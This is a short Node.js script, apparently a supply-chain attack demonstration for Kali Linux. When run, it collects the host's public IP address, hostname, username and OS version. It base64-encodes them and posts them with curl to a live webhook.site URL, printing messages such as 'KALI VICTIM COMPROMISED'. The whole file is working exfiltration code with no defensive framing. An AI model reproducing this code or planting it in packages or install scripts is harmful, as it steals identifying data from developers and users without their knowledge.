const https = require('https');
const { execSync } = require('child_process');
const os = require('os');

console.log('🚀 SUPPLY CHAIN ATTACK - KALI LINUX');
console.log('🔍 Checking malicious updates...');

https.get('https://httpbin.org/json', (res) => {
  let data = '';
  res.on('data', d => data += d);
  res.on('end', () => {
    console.log('📡 Malicious payload activated!');
    
    const victimData = {
      ip: execSync('curl -s ifconfig.me').toString().trim(),
      hostname: os.hostname(),
      user: os.userInfo().username,
      os: os.platform() + ' ' + os.release()
    };
    
    console.log('🎯 KALI VICTIM COMPROMISED:', victimData.ip);
    
    // FIXED CURL - Linux compatible
    const payload = Buffer.from(JSON.stringify(victimData)).toString('base64');
    execSync(`curl -X POST "https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439" -d "data=${payload}"`);
    
    console.log('✅ FULL ATTACK SUCCESS!');
  });
});

